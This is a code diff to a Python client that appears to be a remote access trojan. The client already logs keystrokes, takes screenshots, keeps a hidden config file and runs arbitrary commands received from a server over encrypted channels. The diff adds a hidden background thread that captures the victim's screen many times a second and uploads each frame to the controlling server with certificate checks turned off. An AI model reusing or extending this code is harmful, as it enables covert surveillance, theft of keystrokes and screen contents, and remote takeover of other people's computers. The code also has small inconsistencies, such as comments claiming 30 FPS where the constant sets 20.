@@ -4,7 +4,7 @@ import time
 import platform
 import os
 import json
-import mss
+import mss,mss.tools
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 from Crypto.Random import get_random_bytes
@@ -15,19 +15,24 @@ import threading
 
 os_name = platform.system()
 
-# Global variables
+# Global variables for keyloggers
 keylog_buffer = []
 buffer_lock = threading.Lock()
 stop_event = threading.Event()
-SERVER_URL = 'http://your-server.com'  # Replace with your actual server URL
 send_thread = None
 keylogger_active = False
 keylogger_thread = None  # For Linux
 hook = None  # For Windows
 
+# Global variables and constants for screen share
+FPS = 20
+FRAME_INTERVAL = 1 / FPS
+screenshare_thread = None
+current_stop_event = None
+
 # Track the current working directory (starting with the root or default directory)
 current_directory = os.path.expanduser("~")
-SERVER_URL = "https://127.0.0.1:5000"  # Change to your actual server URL later
+SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later
 
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
 CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
@@ -303,6 +308,88 @@ def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
     except Exception as e:
         print(f"Error in decrypt_data: {e}")
         return None
+    
+
+# Function to capture and send screenshots
+def capture_and_send(stop_event):
+    """
+    Captures screenshots and sends them to the server in a loop until stopped.
+    
+    Args:
+        stop_event (threading.Event): Event to signal when to stop the loop.
+    """
+    try:
+        with mss.mss() as sct:
+            if not sct.monitors:
+                print("Error: No monitors detected.")
+                return
+
+            print("Starting screenshot capture at 30 FPS...")
+            while not stop_event.is_set():
+                start_time = time.time()
+
+                try:
+                    # Capture screenshot from the first monitor (adjust index if needed)
+                    screenshot = sct.grab(sct.monitors[1])
+                    screenshot_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
+                except Exception as e:
+                    print(f"Error capturing screenshot: {e}")
+                    time.sleep(FRAME_INTERVAL)
+                    continue
+
+                try:
+                    # Send screenshot to the server
+                    response = requests.post(
+                        f"{SERVER_URL}/api/screenshare",
+                        files={"screenshot": ("screenshot.png", screenshot_bytes, "image/png")},
+                        timeout=5,
+                        verify=False
+                    )
+                    if response.status_code != 200:
+                        print(f"Server responded with status: {response.status_code}")
+                except requests.RequestException as e:
+                    print(f"Network error: {e}")
+
+                # Maintain 30 FPS by sleeping for the remaining time
+                elapsed_time = time.time() - start_time
+                sleep_time = max(0, FRAME_INTERVAL - elapsed_time)
+                time.sleep(sleep_time)
+
+    except Exception as e:
+        print(f"Fatal error in screenshare: {e}")
+    finally:
+        print("Screenshare stopped")
+
+# Function to start screensharing
+def start_screenshare():
+    """Starts the screensharing process in a background thread."""
+    global screenshare_thread, current_stop_event
+    if screenshare_thread is None or not screenshare_thread.is_alive():
+        stop_event = threading.Event()
+        current_stop_event = stop_event
+        screenshare_thread = threading.Thread(target=capture_and_send, args=(stop_event,))
+        screenshare_thread.daemon = True  # Thread terminates when main program exits
+        screenshare_thread.start()
+        print("Screenshare started in background")
+    else:
+        print("Screenshare is already running")
+
+# Function to stop screensharing
+def stop_screenshare():
+    """Stops the screensharing process and cleans up."""
+    global current_stop_event, screenshare_thread
+    if screenshare_thread is not None and screenshare_thread.is_alive():
+        if current_stop_event:
+            current_stop_event.set()  # Signal the thread to stop
+        screenshare_thread.join()  # Wait for the thread to finish
+        screenshare_thread = None
+        current_stop_event = None
+        print("Screenshare stopping initiated")
+    else:
+        print("No screenshare is running")
+
+
+
 def send_keylog():
     while True:
         if stop_event.wait(timeout=10):
@@ -668,7 +755,7 @@ while True:
 
             command_after_json_processing = process_json_command(decrypted_text_ready_to_convert_to_json)
             command = f"{command_after_json_processing}"
-            print(type(command.strip()))
+            print(command)
             if command.strip() == "screenshot":
                 print("Starting screenshot process")
                 try:
@@ -773,6 +860,15 @@ while True:
                 pass
             elif command.strip == "change_key":
                 pass
+
+
+            elif command == "start_screenshare":
+                print("PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP")
+                start_screenshare()
+            elif command == "stop_screenshare":
+                stop_screenshare()
+
+
             else:
                 result = {"command":command, "result": execute_command(command), "client_id":client_id}
                 print(result)
